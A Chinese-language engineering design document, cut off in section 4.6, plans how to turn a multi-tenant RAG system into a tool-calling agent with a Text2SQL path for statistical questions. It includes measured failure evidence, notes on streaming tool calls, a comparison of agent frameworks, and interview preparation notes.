# 从 RAG 到内部知识库 Agent —— 完整改造方案

> **项目**：`personal_rag`（企业级多租户检索增强问答系统）
> **基线**：分支 `refactor` · HEAD `159d639` · 40 次提交 · 业务代码 **7848 行** · **45 项单测全绿** · **107 题评测集**
> **目标**：升级为「内部知识库 Agent」，统计类问题走 Text2SQL 精确计算
> **文档定位**：**决策文档**。每条改造都给出「为什么 / 改哪里 / 怎么验收 / 简历怎么说」，且**所有关键事实均已一手验证**。

## 阅读指引

| 你想知道 | 看哪一部分 |
|---|---|
| **两个高频问题的直接回答**（路由怎么走 / 是否只支持 xlsx） | **上面的「两个高频问题的直接回答」** |
| 项目现在长什么样、技术栈、优缺点 | **第一部分**（结构全景）、**第二部分**（优缺点诊断） |
| 为什么必须改？有什么证据 | **第三部分**（实测失败案例，含 31.8 倍错误） |
| 技术路线可行吗？选什么框架？ | **第四部分**（调研与选型，含真实 API 验证） |
| 具体怎么改？要多久？ | **第五部分**（8 阶段计划，18.5 人日） + **[text2sql-数据层设计.md](text2sql-数据层设计.md)**（DDL + 数据源边界） |
| 简历怎么写？面试怎么答？ | **第六部分**（简历条目 + **15 道**必答题 + 演示脚本） |

## 证据分级约定

本文档严格区分事实来源，因为结论要写进简历、要扛住面试追问：

- ✅ **一手验证**：我本人通过**真实 API 调用 / 官方页面抓取 / PyPI 元数据接口**确认
- 📄 **官方文档**：抓取到官方文档原文（附链接）
- ⚠️ **未确认**：检索环境限制（GitHub / HuggingFace 在本环境不可达），未取得一手来源，**明确标注、绝不推测**

## 两个高频问题的直接回答

### Q：按这个方案，能否实现「问题进来先做意图识别，需要就走 Text2SQL，不需要还走原来的 RAG」？

**能，但要修正一处理解**：不是「一道入口分叉」，而是**两道关卡串联**——

| 关卡 | 位置 | 机制 | 成本 |
|---|---|---|---|
| **关卡一** | Agent Loop **之外** | 规则路由（纯函数）：命中「聚合词 **且** 已注册列名词」→ 强路由 SQL；命中文档类词 → 强路由 RAG；都不命中 → 放行 | 0 |
| **关卡二** | Agent Loop **之内** | LLM function calling：3 个工具 schema 交模型自主选（可单选、可多选做跨源推理） | +1 次 LLM |
| **关卡三** | 兜底 | 任何异常 / 超步数 / 超时 / 工具全失败 → **强制退回纯 RAG** | 0 |

**关键点**：原 RAG 链路（`Retriever` + 混合检索 + 精排 + 低相关过滤）**一行都不改**，
只是从"唯一路径"变成"被 `kb_search` 工具包装后调用的一条路径"。
**零回归**由关卡三保证。详见 **5.5.1**。

⚠️ **两个必须注意的实现细节**（否则"还能走原来的 RAG"会打折）：
1. **降级路径必须补发标准 `meta` 帧**，否则前端的来源列表和「已隐藏 N 条」徽标会永久空着 → **5.5.3**
2. **`sql_query` 必须自己处理大结果集**（>50 行只回概要 + 标注截断），
   否则上千行结果会炸掉 prompt 上下文，且 LLM 会把截断结果当全集汇报 → **5.5.4**

### Q：当前 Text2SQL 是否只处理 xlsx 格式文件？

**是——SQL 建表只做 xlsx**（后续可低成本扩 CSV）。这是一个**有依据的设计边界，不是疏漏**。

**先厘清概念**：**SQL 查询不直接读文件**。ETL 只在**入库时执行一次**把表格转成关系表；
之后统计问题查的都是**数据库里的表**，与原始格式无关。所以准确问法是
**"哪些格式的文件能在入库时被可靠地转成表"**。

✅ 源码实测结论：

| 格式 | 能否建表 | 原因 |
|---|---|---|
| **xlsx** | ✅ **能** | **sheet 是天然表边界**；openpyxl 逐行读取；有独立 `chunk_xlsx` 策略 |
| **csv**（当前不支持） | ✅ 易扩 | 与 xlsx 同构 |
| **docx** | ⚠️ 暂不做 | 一个 docx 常含多个异构表，表名/语义无来源 |
| **pdf** | ❌ 不做 | 表格提取是启发式，**跨页表会截断**；无表名，表边界靠猜 |
| **md / txt** | ❌ 不做 | Markdown 表格是**排版**不是数据集 |

⚠️ **一个必须知道的障碍**：✅ `loader.py:1415` 把所有单元格 `str()` 化了，
**类型信息在 loader 里已经丢失**。**不要改造 loader**（会触碰 1592 行核心文件、影响评测基线），
而是让 **ETL 直接读原始文件**，与 RAG 通道解耦。详见 **P1 的范围声明** 与
[text2sql-数据层设计.md §5.0](text2sql-数据层设计.md)。

> **面试话术**：被问到"你的 Text2SQL 支持哪些数据源"时，不要说"只支持 Excel"（像能力不足），
> 要说：**"我把数据源收敛到 xlsx，是因为只有它有可靠的表边界（sheet）和可恢复的类型信息；
> PDF/DOCX 的表格提取是启发式的，跨页会截断，用它建表会引入静默错误——而静默错误正是我这个项目要消灭的东西。"**

---
---

# 第一部分 · 项目代码结构全景

## 1.1 一句话定位

一个**前后端分离、多租户隔离、支持流式多轮问答与异步大文件入库的全栈 RAG 平台**。
技术语言：**Python 3.12（后端）+ TypeScript 5.7（前端）+ SQL + Dockerfile/YAML（部署）**。

## 1.2 技术栈分层矩阵（✅ 实测版本）

| 层次 | 选型 | 实测/配置版本 | 在项目中的角色 |
|---|---|---|---|
| 前端框架 | Vue 3 `script setup` | 3.5.13 | SPA 壳 + 组件 |
| 前端语言 | TypeScript | 5.7.2 | 全量类型标注，`vue-tsc` 门禁 |
| 前端构建 | Vite | 6.0.5 | dev server + 生产构建 |
| 前端状态 | Pinia | 2.2.6 | `stores/chat.ts` 单一 store |
| 前端渲染 | markdown-it | 14.1.0 | `html:false` 防 XSS |
| 前端流式 | 原生 `fetch` + `ReadableStream` | — | 手写 SSE 解帧（需 POST + 自定义头，故不用 EventSource） |
| Web 框架 | FastAPI | ≥0.115 | 应用工厂 + lifespan + 依赖注入 |
| 数据校验 | Pydantic v2 / pydantic-settings | ≥2.7 | DTO + **50 字段**统一配置中心 |
| ASGI | uvicorn[standard] | ≥0.32 | 单进程 ASGI |
| ORM | SQLAlchemy 2.0（`Mapped` 声明式） | 2.1.1 | 全异步 `asyncpg` |
| 迁移 | Alembic | ≥1.13 | 异步应用 / 同步迁移双 URL |
| 关系库 | PostgreSQL | 16-alpine | 文档/会话/任务/租户事实来源 |
| 缓存/队列 | Redis | 7-alpine | 会话热缓存 + ARQ 队列 |
| 异步任务 | ARQ | ≥0.26 | 异步入库 worker |
| 向量库 | Qdrant | latest | named vectors `dense`+`bm25`，payload 索引 |
| 嵌入模型 | `BAAI/bge-m3` | 1024 维 | 稠密通道 |
| 稀疏检索 | Qdrant `qdrant/bm25` + jieba 预分词 | — | 稀疏通道 |
| 融合 | RRF（`Fusion.RRF`） | — | 双路排名融合 |
| 精排 | `BAAI/bge-reranker-v2-m3` | — | 交叉编码器 |
| 生成模型 | `deepseek-ai/DeepSeek-V3.2` | — | OpenAI 兼容 `/chat/completions` |
| 模型网关 | SiliconFlow | — | Embedding + Rerank + LLM 同一 Key |
| 文档解析 | PyMuPDF / pdfplumber / python-docx / openpyxl / pandas | — | 五格式 + 三级表格提取 |
| 中文分词 | jieba | ≥0.42 | BM25 对称分词 |
| HTTP 客户端 | `requests`（同步） | ≥2.31 | LLM/Embedding/Rerank 外呼 |
| 可观测 | Langfuse | ≥3.0 | trace/span/generation 软埋点 |
| 容器化 | Docker Compose | — | 六服务编排 + 一次性 migrate |
| 网关 | nginx | alpine | 静态托管 + 同源反代 + SSE 关缓冲 |
| 测试 | pytest + pytest-asyncio | ≥8.0 | 45 例 hermetic 单测 |
| 评测 | 自研 `backend/eval` | — | Recall@K / MRR / Keyword Hit |

## 1.3 目录结构与职责边界

```
personal_rag/
├── backend/                        # Python 后端（7848 行业务代码的主体）
│   ├── app/
│   │   ├── main.py                 # 应用工厂 create_app() + lifespan 资源管理
│   │   ├── database.py             # db 单例：async engine(20+10) + sessionmaker
│   │   ├── api/                    # 路由与装配层（10 个端点）
│   │   │   ├── deps.py             #   get_principal / enforced_filter / get_pipeline
│   │   │   └── v1/                 #   query · chat · sessions · documents · health
│   │   ├── core/                   # 地基：config(50 字段) · security · exceptions · logging
│   │   ├── schemas/                # Pydantic DTO（chat / documents）
│   │   ├── models/                 # ORM：document · chat(session+message) · ingest_task · tenant
│   │   ├── repositories/           # 数据访问：只 flush，不 commit
│   │   ├── services/               # 业务编排：ingestion_service · session_service
│   │   ├── rag/                    # pipeline · retriever · context_builder · prompts · source_formatter
│   │   ├── vector/                 # qdrant(430 行，全项目最重) · embedding · rerank
│   │   ├── ingestion/              # loader(1592 行) · chunking/{text,table,base} · indexer
│   │   ├── llm/                    # provider：complete() / stream()
│   │   ├── worker/                 # ARQ settings · pool · tasks/ingest
│   │   ├── cache/                  # Redis 客户端 + SessionCache
│   │   └── observability/          # Langfuse 软埋点封装
│   ├── migrations/versions/        # Alembic（当前 1 个版本：init_persistence）
│   ├── eval/                       # 自研评测 runner（Recall@K / MRR / 逐题明细）
│   └── tests/                      # 8 文件 45 例，hermetic（不真连外部服务）
├── frontend/src/                   # Vue3 SPA（1737 行）
│   ├── api/{client,types}.ts       # fetch 封装 + SSE 解帧 + 与后端 DTO 一一对应的类型
│   ├── stores/chat.ts              # 会话/消息/流式/租户指纹隔离
│   ├── components/                 # ChatView · MessageBubble · SourcesList · UploadPanel
│   └── App.vue                     # 壳 + Teleport 租户 Key 模态
├── docker_setting/docker-compose.yml  # 六服务 + 一次性 migrate
├── knowledge_base/                 # 入库源文件（15 个文档，含 3 个 xlsx 结构化数据）
├── test_dataset/qa_test_v2.jsonl   # 107 题评测集
└── docs/                           # 项目全景解析 + RAG 面试题库 60 题
```

**分层调用链（严格单向，无环）**：
`api → services → repositories → models`，横向依赖 `core / schemas / cache`；
`rag / vector / ingestion` 是领域内核，被 `services` 与 `worker` 复用，不反向依赖 `api`。

## 1.4 代码量分布（✅ 实测，排除 `.venv` / `node_modules`）

| 模块 | 文件数 | 行数 |
|---|---|---|
| `app/ingestion`（解析+分块） | 7 | **2615** |
| `frontend/src` | 10 | 1737 |
| `tests` | 8 | 634 |
| `app/vector` | 3 | 445 |
| `eval` | 3 | 373 |
| `app/api` | 9 | 339 |
| `app/core` | 5 | 251 |
| `app/rag` | 6 | 235 |
| `app/services` | 3 | 184 |
| `app/observability` | 2 | 175 |
| `app/models` | 6 | 172 |
| `app/repositories` | 5 | 170 |
| `app/worker` | 5 | 116 |
| `app/llm` | 2 | 112 |
| `app/cache` | 2 | 80 |
| 其他（main/database/schemas/`__init__`） | 5 | 212 |
| **合计** | **81** | **7848** |

**读数**：`ingestion` 占后端 33%（1592 行的 loader 是全项目最重文件），说明**这个项目的护城河在"文档解析质量"**；
`rag` 只有 235 行却是核心链路——**编排薄、内核厚，是健康的分层信号**。

## 1.5 结构量化指标（✅ 实测）

| 指标 | 值 | 说明 |
|---|---|---|
| 后端 API 端点 | **10** | `@router.get\|post\|delete` |
| Settings 配置字段 | **50** | `settings.*` 引用点 **79** 处 |
| 代码中 TODO/FIXME/HACK | **0** | 技术债写进文档而非散落注释 |
| 测试 | **45 passed / 4.29s** | `pytest -q` |
| 测试中 mock/patch | **31** 处 | hermetic 风格 |
| Alembic 迁移文件 | **1** | `35fd0e1e9233_init_persistence.py` |
| 未提交文件 | 3 | `.env.example`、`frontend/test.py`、`docker_setting/_eval_rerun.txt` |

## 1.6 四条主链路的真实数据流

**① 问答（读）** — 同步内核 + 异步外壳
```
POST /query
 └─ get_principal            core/security.py：X-API-Key → Principal(tenant_id)
 └─ enforced_filter          api/deps.py：剥除客户端租户键，强制注入服务端 tenant_id
 └─ run_in_threadpool        同步 pipeline 桥接进异步路由（不阻塞事件循环）
     └─ Retriever.search → VectorStore.search
         ├─ embed_query                      bge-m3 dense 向量
         ├─ prefetch[dense ×20] + [bm25 ×20] 双通道召回（jieba 对称分词）
         ├─ FusionQuery(RRF)                 排名融合
         ├─ RerankClient.rerank              交叉编码器重排（异常→降级原序）
         └─ _filter_low_relevance            仅 rerank 绝对分施阈值
     └─ build_context → LLMClient.complete → format_sources
```

**② 入库（写，异步）** — 秒回 + 状态机
```
POST /documents → 落盘(uuid8_原名) → Document(pending)+IngestTask(queued) → ARQ 入队
                → 202 {task_id}                        「上传秒回」
worker: ingest_document → running(10) → asyncio.to_thread(process_file)
        → hash 判重 → load_file → chunk_document → embed → upsert_chunks → done(100)
        失败：failed(error) + re-raise → ARQ 重试（max_tries=5）
前端：GET /documents/{task_id}/status 轮询
```

**③ 会话** — PG 真相 + Redis 热缓存
```
session_id → exists(ACL) → Redis 命中则 touch 续期 → miss 则 PG 回源 + reheat
写入顺序：先 PG（真相）再 Redis（缓存）；租户不符静默跳过
```

**④ 删除** — 外部清理先行
```
DELETE /documents/{id} → get_by_id(id, tenant)  「跨租户=404」
  → _clear_source_vectors(Qdrant) → _remove_physical_file(磁盘) → 都成功才删 DB 行
  任一失败：抛错保留登记行，可重试
```

## 1.7 契约清单（**改动即破坏兼容**）

| 契约 | 内容 | 消费者 |
|---|---|---|
| `pipeline.query()` 返回键 | `query / answer / sources / retrieved_count / hidden_count` | 前端、eval、测试 |
| SSE 事件类型 | `meta → delta* → done / error` | 前端 `chatStream` 解帧 |
| `SourceItem` | `source / format / score / text_preview` | `SourcesList.vue` |
| Qdrant payload `source` | **文件名 = source = 删除键**（三者必须一致） | 重灌/删除共用 |
| Qdrant point ID | `md5(source + text[:200])` → 幂等 upsert | 重灌不产生重复点 |
| `/documents/{task_id}/status` | `queued/running/done/failed + progress` | 上传面板轮询 |

> ⚠️ **这是后续所有改造的红线**：新增 Agent 事件必须**扩帧而非改帧**，否则前端与评测同时崩。

---
---

# 第二部分 · 优缺点诊断

> **先说缺点，因为它决定改造方向。**

## 2.1 真正的优势（能打动面试官的部分，均有代码证据）

| # | 优势 | 证据（可验证） |
|---|---|---|
| 1 | **两级混合检索**：dense + BM25 稀疏 RRF 融合，再交叉编码器精排 | `vector/qdrant.py` `_hybrid_query` / `_rerank_points` |
| 2 | **量纲安全的低相关过滤**：识别出 RRF 分/向量分/rerank 分不可跨 query 比较这一普遍误区 | `_filter_low_relevance` 按 `score_kind` 分支；`test_vector_relevance.py` 钉死 |
| 3 | **单 collection 多租户 ACL**：`tenant_id` 多值 keyword + 服务端 `enforced_filter` 禁止客户端覆盖 | `deps.py:enforced_filter`；`test_security.py` 401/403/匿名矩阵 |
| 4 | **同步内核 + 异步外壳三种桥接**：`run_in_threadpool` / `iterate_in_threadpool` / `asyncio.to_thread` | 问答 / SSE / worker 各司其职，事件循环不阻塞 |
| 5 | **幂等与自愈的入库设计**：content-hash 点 ID、先清后灌、失败 re-raise 交 ARQ 重试 | `_generate_id`、`delete_by_metadata` 共用 |
| 6 | **结构化文档解析专项**：PDF 表格三级提取 + marker 兜底；xlsx 行级语义化 + 大表聚合摘要 | `loader.py` 1592 行；`chunking/table.py` |
| 7 | **hermetic 测试哲学**：45 例不真连 Qdrant/PG/LLM，4.29s 跑完；真链路靠 compose 冒烟补 | `pytest -q` |
| 8 | **交付工程化**：一次性 migrate 服务 `service_completed_successfully`、单镜像双角色、Dockerfile 层缓存 | `docker-compose.yml` |
| 9 | **可观测是软依赖**：Langfuse 未配置全 no-op 零开销 | `observability/langfuse.py` |
| 10 | **文档与代码同步**：0 个 TODO/FIXME，技术债写进文档「不足」章节 | ✅ 实测 grep = 0 |

## 2.2 结构性缺点（按「是否阻挡 Agent 升级」分级）

### 🔴 A 级：直接阻挡升级，必须先解决

| # | 问题 | 位置 | 影响 |
|---|---|---|---|
| **A1** | **LLM 客户端不支持 tool calling**：仅 `complete()`/`stream()`，无 `tools` 参数、不解析 `tool_calls` | `llm/provider.py` | Agent 的**唯一**执行机制就是工具调用，**硬阻塞**。所幸 `openai` SDK **2.54.0 已在环境中**（传递依赖），可直接改用 |
| **A2** | **无 Agent 抽象层**：`pipeline.py` 是硬编码单向流程「检索→拼上下文→生成」，没有「决策」环节 | `rag/pipeline.py` | 无法表达"该检索还是该查库"的分支 |
| **A3** | **SSE 事件契约太窄**：只有 4 类事件，前端把 `meta` 当作"检索完成"信号 | `pipeline.py` + `types.ts` + `stores/chat.ts` | Agent 的中间步骤无处可放，必须扩帧 |
| **A4** | **无 SQL 执行基础设施**：没有只读连接、没有 SQL 校验、没有结果集封装 | 全局缺失 | Text2SQL 的地基 |
| **A5** | **`requests` 同步外呼难以优雅支持流式工具调用** | `provider.py` | 手写 SSE 下 `tool_calls` 的 delta 拼接极易出错（已实测确认结构，见第四部分） |

### 🟠 B 级：Agent 化后会显著放大

| # | 问题 | 位置 | 放大机制 |
|---|---|---|---|
| B1 | **单轮意图路由缺失**：所有问题无条件走向量检索 | `pipeline.py` | Agent 必须区分「查文档」与「查数据」，否则统计题继续错 |
| B2 | **错误静默降级**：rerank 失败降级原序、LLM 失败返回友好文案但不抛错 | `qdrant.py:_rerank_points`、`provider.py:complete` | Agent 多步链路中，静默降级会让**错误答案看起来像正常答案**（实测：答 1017 还自称"逻辑上可调和"） |
| B3 | **无 token/成本记账**：`usage` 只喂 Langfuse，未落库、无配额 | `provider.py` | Agent 单次问答可能 5–10 次 LLM 调用，成本与延迟放大一个数量级 |
| B4 | **无限流/配额** | 全局缺失 | Agent + SQL 执行 = 更贵的攻击面 |
| B5 | **会话 `next_seq` 读-增-写竞态** | `repositories/session_repo.py` | Agent 多步写入放大撞 `unique(session_id,seq)` 概率 |
| B6 | **worker 单并发 `max_jobs=1`** | `worker/settings.py` | 若把"数据表同步"也做成任务，会与大文件入库抢队尾 |
| B7 | **`_SUMMARY_MIN_ROWS = 1000` 等魔法数硬编码** | `loader.py:1251` | 走 SQL 路线后摘要逻辑要保留但需可配置（作为 RAG 兜底） |

### 🟡 C 级：工程完备性欠账

| # | 问题 | 影响 |
|---|---|---|
| C1 | **无 CI/CD**：pytest / 前端 build / 评测全手工 | 简历上"质量保障"缺硬证据链 |
| C2 | **鉴权是静态 `.env` 明文 Key**：无过期/轮换/吊销；Key 还烘进了前端 bundle | 生产不可用；演示可解释 |
| C3 | **无 RBAC**：`Principal` 只有 `tenant_id`，同租户内人人等价 | 🔴 **Text2SQL 会把它放大成"谁能查全公司薪资"——直接升为 A 级** |
| C4 | **评测只有检索指标**：无答案质量、无端到端、无 CI 门禁 | 92%→99% 是 Recall@5，**不是答案正确率，需诚实区分** |
| C5 | **无备份 / 无对账**：PG 与 Qdrant payload 可能漂移 | 三段删除长期半途失败无 reconcile |
| C6 | **日志 `print` 残留 3 处、无结构化日志、trace_id 未贯穿** | 排障靠 grep |
| C7 | **前端功能面窄**：无历史会话列表、无分页、无图表 | Text2SQL 结果需图表才有说服力 |

## 2.3 一句话诊断

> 这**不是一个玩具项目**：分层、契约、幂等、降级、评测、容器化都有真实工程痕迹，7848 行代码里 0 个 TODO。
> 它的**天花板不在工程质量，而在能力边界**——所有智能都建立在「检索到的局部片段」之上，
> 因此凡是需要**跨全量数据做精确计算**的问题（聚合、对比、排序、占比），它从原理上就答不对。
> 而 `159d639` 那个「为大表预生成聚合摘要块」的提交，正是撞到天花板后的一次**有意识的补丁**——
> 它把 Recall@5 从 95.05% 拉到 99.01%，但覆盖面仅「分组计数最多/最少 + 数值列 Top3/Bottom3」，
> 组合空间（任意两部门对比、任意时间窗、任意多条件）**无法穷举预计算**。
> **升级为 Agent + Text2SQL，本质是把"检索局部片段"升级为"按需精确计算"。**

---
---

# 第三部分 · 实测证据：RAG 在统计类问题上的真实失败

> 这是整个改造计划的**立项依据**，全部为实测数据。

## 3.1 实验设计

- 环境 ✅：全栈 Docker 运行中（backend/frontend/postgres/redis 均 healthy，qdrant/worker Up）
- 向量库 ✅：`personal_rag_v2` 共 **1402** 个点（旧版 `personal_rag` 残留 1154 点，结构不兼容已弃用）
- 接口：`POST /api/v1/query`（真实 LLM 生成，`top_k=5`）
- 问题：`员工表中Sales部门和Engineering部门各有多少人？两者相差多少人？`
- 真值：用 `pandas` 直读 `knowledge_base/xlsx-sample-large-10000-rows.xlsx` 计算

## 3.2 结果对比

| 指标 | RAG 回答 | pandas 真值 | 判定 |
|---|---|---|---|
| Sales 部门人数 | 1042 | **1042** | ✅ 命中预生成摘要块 |
| Engineering 部门人数 | **25** | **1010** | ❌ 误差 40.4 倍 |
| 两者差值 | **1017** | **32** | ❌ **误差 31.8 倍** |

**RAG 的完整回答（节选）**：
> 根据参考 1 的统计摘要，Sales 部门人数为 **1042 人**。
> 参考 1 未直接给出 Engineering 部门的总人数。但参考 2 至参考 5（来自同一表格）提供了
> Engineering 部门下各团队的人数：Frontend 8 人、Backend 12 人、DevOps 5 人，
> 合计 8 + 12 + 5 = **25 人**。
> 两者相差 1042 − 25 = **1017 人**。
> **注意**：Engineering 部门人数是基于细分团队数据计算得出的……两个数据来源不同，
> **但逻辑上可调和**（细分团队数据可能未包含在参考 1 的部门分组统计中，或属于不同数据集）。

**检索结果（5 条，全部相关，`hidden_count=0`）**：

| # | source | rerank 分 | 内容 |
|---|---|---|---|
| 1 | `xlsx-sample-large-10000-rows.xlsx` | 0.6978 | 全表统计摘要（Sales 1042 / Finance 956 / 薪资 Top3…） |
| 2 | `sample-files.com-table-document.docx` | 0.6562 | 「部门为 Engineering，团队为 Backend，人数 12」 |
| 3 | `sample-files.com-table-document.docx` | 0.5761 | Frontend 8 |
| 4 | `sample-files.com-table-document.docx` | 0.5120 | DevOps 5 |
| 5 | `sample-files.com-table-document.docx` | 0.1645 | 该 docx 的表格原文 |

## 3.3 四点归因（同时解释了「为什么必须上 SQL」）

1. **局部块原理性缺失**：万行 xlsx 被切成 **242 个块**，任何单块都不含全表聚合事实。
2. **预计算补丁有组合爆炸天花板**：`_build_sheet_summary`（`loader.py:1292`）只产出
   「分组计数最多/最少 + 数值列 Top3/Bottom3」。而「任意两部门对比」的组合数是 O(C(n,2))，
   「任意时间窗 + 任意条件」组合空间无限——**穷举预计算不可行**。
3. **跨文件同质词面混淆**：两个不同文件都有 "Engineering"，检索把 docx 的行级块当成了答案来源。
   **BM25 与向量检索都无法区分"同名词但不同数据集"**。
4. **⚠️ 最危险的一点：错误不可见**。rerank 分数 0.66/0.58/0.51 **全部正常偏高**，低相关过滤
   （`hidden_count=0`）**帮不上任何忙**——因为错误不是"不相关"，而是"局部相关"。
   系统还主动写了一句"逻辑上可调和"来自我辩护。**用户没有任何信号可以察觉这是错的。**

> 💡 **这是整个项目最有价值的一句话**（面试时的杀手锏）：
> "我把 rerank 分数、低相关过滤、拒答兜底全部做对了，但统计类问题的**错误依然 100% 静默**——
> 因为检索系统的相关性度量**不度量完备性**。这个认知直接驱动我引入了 Text2SQL 精确计算通道。"

## 3.4 需求规模：不是个例

107 题评测集中，**≥15 题（约 14%）属于聚合/统计类**，且这是**刻意只放了少量**的结果：

```
哪个产品带来的总营收最高？                        → xlsx-sample-multiple-sheets.xlsx
MegaPack 产品一共卖出了多少单位？                 → xlsx-sample-multiple-sheets.xlsx
平均客单价 Average Sale 是多少？                  → xlsx-sample-multiple-sheets.xlsx
员工表中哪个部门人数最多？/ 最少？                 → xlsx-sample-large-10000-rows.xlsx
全公司薪资最高的员工是谁，属于哪个部门？           → xlsx-sample-large-10000-rows.xlsx
2026 年入职的员工有多少人？                       → xlsx-sample-large-10000-rows.xlsx
docx-sample-with-table.docx 中薪资最高的员工？    → docx-sample-with-table.docx
ROI 为 -36.8% 对应的是哪个部门                   → pdf-sample-a3.pdf
Satisfaction Score 为 4.8/5.0 的是哪个部门        → pdf-sample-a3.pdf
```

**真实企业场景只会更多**：内部知识库助手被问到的统计类问题（"本月各部门工单量"、"上季度 ROI 排名"、
"哪些合同快到期了"）天然需要精确计算，用 RAG 硬答等于**在内部系统里制造可信的错误**。

## 3.5 附带发现：旧 collection 结构不兼容

✅ 实测：`personal_rag`（1154 点，单无名向量 `size,distance`）与 `personal_rag_v2`（1402 点，named vector `dense`）
并存。`_ensure_collection` 有结构校验会抛 `RuntimeError` 并提示重建——**设计正确**，
但旧 collection 应清理（P0 顺手做掉）。

---
---

# 第四部分 · 可行性调研与技术选型

> **可行性验证的三个致命假设，已用真实 API 调用排除。**

## 4.1 ✅ 假设一：现有模型支持 OpenAI 兼容 function calling —— 成立

| 项目 | 结论 |
|---|---|
| 验证方式 | 真实 `POST https://api.siliconflow.cn/v1/chat/completions`，带 `tools` + `tool_choice:auto` |
| `deepseek-ai/DeepSeek-V3.2` | ✅ HTTP 200，`finish_reason=tool_calls` |
| `deepseek-ai/DeepSeek-V3` | ✅ HTTP 200，`finish_reason=tool_calls` |
| 生成质量 | 问「Sales 和 Engineering 各多少人」→ 生成 `SELECT department, COUNT(*) FROM employees WHERE department IN ('Sales','Engineering') GROUP BY department`——**语义完全正确** |

## 4.2 ✅ 假设二：流式 tool_calls 可用 —— 成立，且有必须照抄的实现细节

逐帧打印真实流式响应（36 帧），确认 delta 的确切结构：

```
帧 #1..#12   delta.content = "我来"、"帮"、"您"…          ← 先输出自然语言
帧 #13       delta.tool_calls[0] = {index:0, id:"01a1…", type:"function",
                                    function:{name:"sql_query", arguments:""}}   ← 第一帧给 id+name
帧 #14       delta.tool_calls[0].function.arguments = "{"                          ← 起
帧 #15       …arguments = "\"sql\": \"SELECT"                                      ← 参数分片
帧 #16..35   …arguments = " COUNT"、"(*)"、" as"、" 202"、"6"、"年"…               ← 逐字符累积
帧 #36       finish_reason = "tool_calls"
[之后]       data: [DONE]
```

**必须照做的三条实现细节**（最容易写错的地方）：

1. `id` 和 `function.name` **只在第一帧出现**，后续帧的 `id`/`type`/`name` 都是 `null` 或空串。
   → 必须**按 `index` 累积 `arguments` 字符串**，且**只在首次出现时记录 id/name**。
   用"后写覆盖"的朴素合并会把 `name` 覆盖成空串。
2. `arguments` 是**逐字符 JSON 字符串分片**（`"{"` 只是一个左花括号），
   **必须等 `finish_reason == "tool_calls"` 之后才能 `json.loads`**，中途解析必然失败。
3. **每一帧都带累计 `usage`**（单调递增），→ 成本记账**只需取最后一帧的 usage**，无需自己累加。

## 4.3 ✅ 假设三：中文列名与口径歧义 —— 成立

| 测试 | 结果 |
|---|---|
| 中文列名表 `cabinet_costs(item, brand_model, unit_price, quantity…)` 问「单价最贵的三个项目」 | ✅ 生成 `SELECT item, brand_model, unit_price, unit FROM cabinet_costs ORDER BY unit_price DESC LIMIT 3` |
| 歧义问题「平均客单价是多少？」（未给工具，prompt 要求口径不唯一须澄清） | ✅ 模型回复"需要先澄清'客单价'的统计口径，例如是按订单、客户还是产品计算"——**没有瞎猜** |

## 4.4 ⚠️ 由此修正的一个过时认知

网上流传的「DeepSeek-R1 / reasoner 不支持 function calling」**已过时**。DeepSeek 官方 Tool Calls 文档现行原文：

> *"From DeepSeek-V3.2, the API supports tool use in the thinking mode."*（[来源](https://api-docs.deepseek.com/guides/tool_calls)）

但思考模式带来三个**会导致线上 400 的硬约束**：

| 约束 | 后果 | 应对 |
|---|---|---|
| 请求带 `tools` 时，**必须把 `reasoning_content` 完整回传**到后续每一轮（即使某轮没调工具） | 不回传 → **HTTP 400** | 消息历史必须保留 `reasoning_content`（**直接冲击现有 `messages` 表设计！**） |
| 思考模式下 `tool_choice` 不支持 `required` 与指定具体工具，只支持 `none`/`auto` | 用 `required` 逼模型调工具 → **400** | 用 `auto` + prompt 引导 |
| Chat Completions **不支持在对话中间插入 tool call**（只支持中间插 system） | 无法做事后补工具结果 | 需改用 Responses API 或 Anthropic API |

## 4.5 Agent 框架选型对比（✅ 版本/许可证均为 PyPI 元数据接口实测）

| 框架 | 实测版本 | Python | 许可证 | 核心抽象 | 嵌入已有 FastAPI 项目的成本 |
|---|---|---|---|---|---|
| **LangGraph** | `1.2.14` | ≥3.10 | MIT | 图 / 状态机，官方主推 durable execution / streaming / HITL / persistence | 中。抽象较重，但可只用于 Agent 子图 |
| **Pydantic AI** | `2.54.0` | ≥3.10 | MIT | 类型化 Agent + 依赖注入，OTel 原生 | **低**。项目**已重度使用 Pydantic v2 + FastAPI**，心智成本最低 |
| **LlamaIndex** | `llama-index-core 0.14.25` | ≥3.10 | MIT | Workflows / Agent | 中高。生态庞大，易与自研 pipeline 重叠 |
| **AutoGen** | `autogen-agentchat 0.7.5` | ≥3.10 | MIT | 多 Agent 对话 | 中。偏多智能体协作，本项目暂不需要 |
| **CrewAI** | `1.15.25` | ≥3.10 | ⚠️ 未取到 license 字段 | 角色扮演 / Crew | 中。抽象与需求不匹配 |
| **OpenAI Agents SDK** | `openai-agents 0.23.1` | ≥3.10 | MIT | Agent + Handoff + Guardrail | 低。但强绑定 OpenAI 生态语义 |
| **Google ADK** | `google-adk 2.11.0` | ≥3.10 | Apache-2.0 | Agent / Tool | 中高。偏 Google 生态 |
| **Vanna.AI** | `vanna 2.0.2` | ≥3.9 | MIT | **Text2SQL 专用**（RAG on schema + few-shot） | 低（作为库），但自带向量存储与训练流程，**与本项目"复用现有 Qdrant"冲突** |
| **DB-GPT** | `dbgpt 0.8.2` | ≥3.10 | MIT | **平台级** | 高。要替换整个应用，不是库 |

**选型结论：手写有界 Agent Loop，暂不引入框架。** 三条理由（都能直接回答面试追问）：

1. **需求面窄**：只有 3 个工具、循环上界明确、无多 Agent 协作、无人在回路审批。
   引入图编排框架是**用 1000 行的抽象解决 300 行的问题**。
2. **必须复用既有资产**：SSE 事件契约、`enforce_filter` 多租户、hermetic 测试体系、Langfuse 软埋点。
   框架会把这些"包起来"，反而增加调试链路长度。
3. **可单测性是本项目的核心资产**：手写状态机可做到**路由/终止/降级 100% 单测覆盖**；
   图执行需要额外测试设施。

**但要主动说清"什么时候会换"**（面试官喜欢听边界条件）：
> "如果要做**多 Agent 协作**或**人在回路审批**（比如 SQL 执行前人工确认），我会切到 LangGraph——
> 它的 checkpoint 和 interrupt 能力我手写要花大力气。我也认真评估了 Pydantic AI，
> 它与我的 Pydantic v2 + FastAPI 技术栈最契合，是**第二选择**。"

## 4.6 Text2SQL 同类项目对比

| 方案 | 类型 | 它怎么做 | 为什么**不直接采用** |
|---|---|---|---|
